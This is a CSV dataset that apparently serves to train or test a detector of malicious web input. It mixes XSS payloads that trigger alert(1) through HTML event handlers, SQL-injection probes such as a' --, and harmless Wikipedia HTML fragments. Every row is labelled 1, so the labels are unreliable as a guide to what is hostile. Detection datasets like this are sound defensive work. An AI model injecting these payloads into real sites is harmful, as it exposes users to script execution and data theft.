text,target
a,1
a',1
a' --,1
<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>,1
</li>,1
"<li><a href=""/wiki/Philosophy_of_computer_science"" title=""Philosophy of computer science"">Computer science </a> </li> </ul> </li>",1
"<em draggable=""true"" ondragleave=""alert(1)"">test</em>",1
</span> </h4>,1
"<small onbeforecut=""alert(1)"" contenteditable>test</small>",1
"<article draggable=""true"" ondragstart=""alert(1)"">test</article>",1
"<cite onkeyup=""alert(1)"" contenteditable>test</cite>",1
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,1
<data onpointerleave=alert(1)>XSS</data>,1
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",1
</span>(2012) </li>,1
"<li><a href=""/wiki/Juggling_robot"" title=""Juggling robot"">Juggling </a> </li>",1
"<li id=""cite_note-FOOTNOTEWengMcClellandPentlandSporns2001-168""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEWengMcClellandPentlandSporns2001_168-0"">^ </a> </b>",1
"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>",1
</span> </li>,1
<del id=x tabindex=1 onactivate=alert(1)></del>,1
"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>",1
"<li id=""cite_note-262""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-262"">^ </a> </b>",1
"<li class=""toclevel-2 tocsection-15""><a href=""#Cybernetics_and_brain_simulation""><span class=""tocnumber"">5.1",1
<optgroup onpointerover=alert(1)>XSS</optgroup>,1
</span>,1
"</li><li style=""min-height: 31px;""><span style=""display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/27px-Wikibooks-logo.svg.png"" decoding=""async"" width=""27"" height=""27"" style=""vertical-align: middle"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/41px-Wikibooks-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/54px-Wikibooks-logo.svg.png 2x"" data-file-width=""300"" data-file-height=""300"" /> ",1
<audio onpointermove=alert(1)>XSS</audio>,1
"<aside onmouseout=""alert(1)"">test</aside>",1
<div>,1
"<li><a href=""/wiki/Viv_(software)"" title=""Viv (software)"">Viv </a><span class=""nowrap"">&#160;",1
</span> </a> </li>,1
"<canvas onbeforecut=""alert(1)"" contenteditable>test</canvas>",1
</span>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",1
</span>,1
"<div draggable=""true"" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",1
"<tbody draggable=""true"" ondragenter=""alert(1)"">test</tbody>",1
"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=48"" title=""Edit section: Philosophy and ethics"">edit </a><span class=""mw-editsection-bracket"">] ",1
